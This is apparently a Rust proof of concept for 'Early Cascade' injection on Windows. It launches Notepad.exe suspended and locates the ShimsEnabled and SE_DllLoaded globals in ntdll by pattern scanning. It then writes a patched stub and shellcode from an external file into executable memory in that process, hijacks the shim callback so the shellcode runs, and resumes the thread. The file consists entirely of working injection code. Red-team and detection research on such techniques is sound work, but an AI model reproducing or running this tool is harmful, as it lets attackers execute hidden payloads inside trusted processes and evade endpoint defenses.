#![allow(non_upper_case_globals)]
use std::{
    ffi::CString, intrinsics::copy_nonoverlapping, mem::zeroed, ops::Add, os::raw::c_void,
    ptr::null_mut,
};

use windows_sys::Win32::{
    Foundation::{CloseHandle, HCN_E_NETWORK_NOT_FOUND},
    System::{
        Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, WriteProcessMemory},
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
        SystemServices::IMAGE_DOS_HEADER,
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
            TerminateProcess,
        },
    },
};

const STUB: &[u8] = &[
    0x48, 0x83, 0xec, 0x38, // sub rsp, 38h
    0x33, 0xc0, // xor eax, eax
    0x45, 0x33, 0xc9, // xor r9d, r9d
    0x48, 0x21, 0x44, 0x24, 0x20, // and [rsp+38h+var_18], rax
    0x48, 0xba, //
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, // mov rdx, 8888888888888888h
    0xa2, // (offset: 25)
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, // mov ds:9999999999999999h, al
    0x49, 0xb8, //
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, // mov r8, 7777777777777777h
    0x48, 0x8d, 0x48, 0xfe, // lea rcx, [rax-2]
    0x48, 0xb8, //
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, // mov rax, 6666666666666666h
    0xff, 0xd0, // call rax
    0x33, 0xc0, // xor eax, eax
    0x48, 0x83, 0xc4, 0x38, // add rsp, 38h
    0xc3, // retn
];

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

const MAX_PATTERN_SIZE: usize = 0x20;

#[repr(C)]
struct CascadePattern {
    data: [u8; MAX_PATTERN_SIZE],
    size: u8,
    pc_offset: u8,
}

// fn pe_section_base(module_base: *mut c_void, section_name: &str) -> *mut c_void {
//     unsafe {
//         let dos_header = module_base as *const IMAGE_DOS_HEADER;

//         if dos_header.read().e_magic != IMAGE_DOS_SIGNATURE {
//             println!("[-] Invalid DOS signature");
//             return null_mut();
//         }

//         let nt_headers = (module_base as *const u8).add(dos_header.read().e_lfanew as usize)
//             as *const IMAGE_NT_HEADERS64;

//         if nt_headers.read().Signature != IMAGE_NT_SIGNATURE {
//             println!("[-] Invalid NT signature");
//             return null_mut();
//         }

//         let first_section = (nt_headers as *const u8).add(size_of::<IMAGE_NT_HEADERS64>())
//             as *const IMAGE_SECTION_HEADER;

//         for i in 0..nt_headers.read().FileHeader.NumberOfSections {
//             if section_name.eq_ignore_ascii_case(
//                 from_utf8(&(*first_section.add(i as usize)).Name)
//                     .unwrap()
//                     .trim_end_matches('\0'),
//             ) {
//                 println!(
//                     "[+] Found section {} at address: {:?}",
//                     section_name,
//                     (*first_section.add(i as usize)).VirtualAddress
//                 );
//                 return (module_base as *const u8)
//                     .add((*first_section.add(i as usize)).VirtualAddress as usize)
//                     as *mut c_void;
//             }
//         }
//     }

//     null_mut()
// }

fn rotr64(value: u64, shift: u64) -> u64 {
    let shift = shift & 63;
    (value >> shift) | (value << (64 - shift))
}

fn encode_system_ptr(ptr: *mut c_void) -> *mut c_void {
    unsafe {
        let cookie = *(0x7FFE0330 as *const u32);
        let encoded = rotr64(cookie as u64 ^ ptr as u64, (cookie & 0x3F) as u64);
        encoded as *mut c_void
    }
}

fn find_offset(base: *const u8, size: usize, pattern: &[u8]) -> usize {
    for i in 0..(size - pattern.len()) {
        let mut found = true;
        for j in 0..pattern.len() {
            if unsafe { *base.add(i + j) != pattern[j] } {
                found = false;
                break;
            }
        }
        if found {
            return i;
        }
    }
    0
}

fn find_pattern(buffer: &[u8], pattern: &[u8]) -> Option<usize> {
    if pattern.len() > buffer.len() {
        return None;
    }

    for i in 0..=buffer.len() - pattern.len() {
        if &buffer[i..i + pattern.len()] == pattern {
            return Some(i);
        }
    }
    None
}

unsafe fn find_se_dll_loaded_address(
    h_ntdll: *mut c_void,
    offset_address: &mut *mut c_void,
) -> *mut c_void {
    unsafe {
        let patterns: [CascadePattern; 2] = [
            CascadePattern {
                data: *b"\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B\x3D\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
                size: 0x0C,
                pc_offset: 0x04,
            },
            CascadePattern {
                data: [0; MAX_PATTERN_SIZE],
                size: 0,
                pc_offset: 0,
            },
        ];

        let dos_headers = h_ntdll as *const IMAGE_DOS_HEADER;
        let nt_headers = (h_ntdll as *const u8).add((*dos_headers).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        let num_of_sec = (*nt_headers).FileHeader.NumberOfSections;
        let first_section = (nt_headers as *const u8).add(size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;
        let mut text_section: *const IMAGE_SECTION_HEADER = null_mut();
        let mut mrdata_section: *const IMAGE_SECTION_HEADER = null_mut();

        for i in 0..num_of_sec {
            let section = &*first_section.add(i as usize);
            let section_name = std::str::from_utf8(&section.Name)
                .unwrap()
                .trim_end_matches('\0');
            if section_name == ".text" {
                text_section = first_section.add(i as usize);
            } else if section_name == ".mrdata" {
                mrdata_section = first_section.add(i as usize);
            }
        }

        for pattern in &patterns {
            if pattern.size == 0 {
                continue;
            }

            let mut result_ptr = h_ntdll.add(text_section.read().VirtualAddress as usize);
            let text_end_ptr = result_ptr.add(text_section.read().Misc.VirtualSize as usize);

            while let Some(offset) = find_pattern(
                &std::slice::from_raw_parts(
                    result_ptr as *const u8,
                    (text_end_ptr as usize) - (result_ptr as usize),
                ),
                &pattern.data[..pattern.size as usize],
            ) {
                result_ptr = result_ptr.add(offset + pattern.size as usize);

                if *(result_ptr.add(3) as *const u8) == 0x00 {
                    let rel_offset = std::ptr::read_unaligned(result_ptr as *const u32);
                    let ptr =
                        (result_ptr as usize).add(rel_offset as usize + pattern.pc_offset as usize);

                    let mrdata_start =
                        (h_ntdll as usize).add((*mrdata_section).VirtualAddress as usize);
                    let mrdata_end = mrdata_start.add((*mrdata_section).Misc.VirtualSize as usize);

                    if ptr >= mrdata_start && ptr < mrdata_end {
                        *offset_address = result_ptr as *mut c_void;
                        return ptr as *mut c_void;
                    }
                }

                result_ptr = result_ptr.add(1);
            }
        }
    }
    *offset_address = null_mut();
    null_mut()
}

unsafe fn find_shims_enabled_address(
    h_ntdll: *mut c_void,
    dll_loaded_offset_address: *mut c_void,
) -> *mut c_void {
    unsafe {
        let patterns: [CascadePattern; 3] = [
            CascadePattern {
                data: *b"\xc6\x05\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
                size: 0x02,
                pc_offset: 0x05,
            },
            CascadePattern {
                data: *b"\x44\x38\x25\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
                size: 0x03,
                pc_offset: 0x04,
            },
            CascadePattern {
                data: [0; MAX_PATTERN_SIZE],
                size: 0,
                pc_offset: 0,
            },
        ];

        let dos_headers = h_ntdll as *const IMAGE_DOS_HEADER;
        let nt_headers = (h_ntdll as *const u8).add((*dos_headers).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        let num_of_sec = (*nt_headers).FileHeader.NumberOfSections;
        let first_section = (nt_headers as *const u8).add(size_of::<IMAGE_NT_HEADERS64>())
            as *const IMAGE_SECTION_HEADER;

        let mut data_section: *const IMAGE_SECTION_HEADER = null_mut();

        for i in 0..num_of_sec {
            let section = &*first_section.add(i as usize);
            let section_name = std::str::from_utf8(&section.Name)
                .unwrap()
                .trim_end_matches('\0');
            if section_name == ".data" {
                data_section = first_section.add(i as usize);
            }
        }

        for pattern in &patterns {
            if pattern.size == 0 {
                continue;
            }

            let start_ptr = if dll_loaded_offset_address as usize >= 0xFF {
                (dll_loaded_offset_address as usize) - 0xFF
            } else {
                0
            };
            let end_ptr = (dll_loaded_offset_address as usize) + 0xFF;

            let mut current_ptr = start_ptr;

            while let Some(offset) = find_pattern(
                &std::slice::from_raw_parts(start_ptr as *const u8, end_ptr - start_ptr),
                &pattern.data[..pattern.size as usize],
            ) {
                let found_ptr = current_ptr + offset;

                if *(found_ptr as *const u8).add(pattern.size as usize + 3) == 0x00 {
                    let rel_offset_ptr = found_ptr + pattern.size as usize;
                    let rel_offset = std::ptr::read_unaligned(rel_offset_ptr as *const i32);

                    let result_ptr = (found_ptr as isize
                        + pattern.pc_offset as isize
                        + rel_offset as isize) as usize;

                    let data_start = (h_ntdll as usize) + (*data_section).VirtualAddress as usize;
                    let data_end = data_start + (*data_section).Misc.VirtualSize as usize;

                    if result_ptr >= data_start && result_ptr < data_end {
                        return result_ptr as *mut c_void;
                    }
                }

                current_ptr = found_ptr + 1;
            }
        }
    }

    null_mut()
}

fn patch_stub(stub: &mut [u8], g_value: u64, offset: usize) {
    let g_value_bytes = g_value.to_ne_bytes();
    stub[offset..offset + 8].copy_from_slice(&g_value_bytes);

    let bytes = &stub[offset..offset + 8];
    let patched_value = u64::from_ne_bytes(bytes.try_into().unwrap());

    println!(
        "[+] Patched stub at offset {} with value: 0x{:016X}",
        offset, patched_value
    );
}

fn main() {
    let proc_name = CString::new("Notepad.exe").unwrap();
    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        si.cb = size_of::<STARTUPINFOA>() as u32;

        let mut pi = zeroed::<PROCESS_INFORMATION>();

        if CreateProcessA(
            null_mut(),
            proc_name.as_ptr() as *mut u8,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to {:?} create process", proc_name);
            return;
        }

        println!(
            "[+] Create {:?} process with PID: {}",
            proc_name, pi.dwProcessId
        );

        let ntdll_handle = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);

        // 0x9999999999999999
        // 0x8888888888888888
        // 0x7777777777777777
        // 0x6666666666666666

        let mut offset_address: *mut c_void = null_mut();
        let se_dll_loaded_addr =
            find_se_dll_loaded_address(ntdll_handle as *mut c_void, &mut offset_address);
        println!("[+] Found SE_DllLoaded address: {:?}", se_dll_loaded_addr);

        let shims_enabled_addr =
            find_shims_enabled_address(ntdll_handle as *mut c_void, offset_address);
        println!("[+] Found ShimsEnabled address: {:?}", shims_enabled_addr);

        let length = STUB.len() + SHELLCODE.len();

        let remote_buffer = VirtualAllocEx(
            pi.hProcess,
            null_mut(),
            length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_buffer.is_null() {
            println!("[-] Failed to allocate memory in remote process");
            TerminateProcess(pi.hProcess, 0);
            return;
        }

        println!("[+] Allocated {} bytes at {:p}", length, remote_buffer);

        let mut patched_stub = STUB.to_vec();

        let g_value = remote_buffer.add(STUB.len()) as u64;
        let pattern = [0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88];
        let offset = find_pattern(&patched_stub, &pattern).unwrap();
        println!(
            "[+] Found pattern 0x{} at offset: {:?}",
            pattern
                .iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>()
                .join(""),
            offset
        );

        patch_stub(&mut patched_stub, g_value, offset);

        let pattern = [0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99];
        let offset = find_pattern(&patched_stub, &pattern).unwrap();
        println!(
            "[+] Found pattern 0x{} at offset: {:?}",
            pattern
                .iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>()
                .join(""),
            offset
        );

        patch_stub(&mut patched_stub, shims_enabled_addr as u64, offset);

        let pattern = [0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77];
        let offset = find_pattern(&patched_stub, &pattern).unwrap();
        println!(
            "[+] Found pattern 0x{} at offset: {:?}",
            pattern
                .iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>()
                .join(""),
            offset
        );

        patch_stub(&mut patched_stub, 0 as u64, offset);

        let pattern = [0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66];
        let offset = find_pattern(&patched_stub, &pattern).unwrap();
        println!(
            "[+] Found pattern 0x{} at offset: {:?}",
            pattern
                .iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>()
                .join(""),
            offset
        );

        let nt_queue_apc_addr =
            GetProcAddress(ntdll_handle, "NtQueueApcThread\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;

        if nt_queue_apc_addr.is_null() {
            println!("[-] Failed to get NtQueueApcThread address");
            TerminateProcess(pi.hProcess, 0);
            return;
        }

        patch_stub(&mut patched_stub, nt_queue_apc_addr as u64, offset);

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            pi.hProcess,
            remote_buffer,
            patched_stub.as_ptr() as *const c_void,
            STUB.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write stub to remote process");
            TerminateProcess(pi.hProcess, 0);
            return;
        }

        println!(
            "[+] Written stub at {:p} ({} bytes)",
            remote_buffer, bytes_written
        );

        if WriteProcessMemory(
            pi.hProcess,
            remote_buffer.add(STUB.len()),
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write to shellcode remote process");
            TerminateProcess(pi.hProcess, 0);
            return;
        }

        let g_value = true;

        if WriteProcessMemory(
            pi.hProcess,
            shims_enabled_addr,
            &g_value as *const _ as *const c_void,
            std::mem::size_of_val(&g_value),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write remote process");
            TerminateProcess(pi.hProcess, 0);
        }

        let g_value = encode_system_ptr(remote_buffer);

        if WriteProcessMemory(
            pi.hProcess,
            se_dll_loaded_addr,
            &g_value as *const _ as *const c_void,
            std::mem::size_of_val(&g_value),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write to remote process");
            TerminateProcess(pi.hProcess, 0);
        }

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
